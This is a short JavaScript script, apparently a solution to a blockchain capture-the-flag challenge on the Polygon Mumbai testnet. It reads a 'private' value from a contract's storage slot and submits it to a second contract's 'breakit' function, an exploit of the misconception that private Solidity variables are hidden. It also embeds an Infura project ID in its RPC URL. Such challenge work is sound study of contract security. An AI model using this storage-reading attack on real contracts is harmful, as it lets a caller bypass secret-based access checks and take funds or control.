import {ethers, keccak256, solidityPackedKeccak256} from 'ethers';
import {ABI} from './Challenge-11-ABI.js';
const rpc_url = "https://polygon-mumbai.infura.io/v3/ba8a3893f5f34779b1ea295f176a73c6" 
const provider = new ethers.JsonRpcProvider(rpc_url);

async function start() {
    const contract_address = "0x8EC4E1d54370f8Bdd6f9Da9f16373E9BbD3cb528" //privacy contract address
    const slot = 5
    const data = await provider.getStorage(contract_address, slot) 
    console.log("Private Data :", data);
    const contract_address2 = "0x42eB7f6748d96A7856c06ca1E633F15a0031d064" //Breakprivacy contract address
    const privateKey = process.env.PRIVATE_KEY;
    const wallet = new ethers.Wallet(privateKey, provider);
    const contract = new ethers.Contract(contract_address2, ABI, wallet); //abi of breakprivacy contract
    const tx = await contract.breakit(data.toString());
    const receipt = await tx.wait();
    console.log(receipt);
}

start()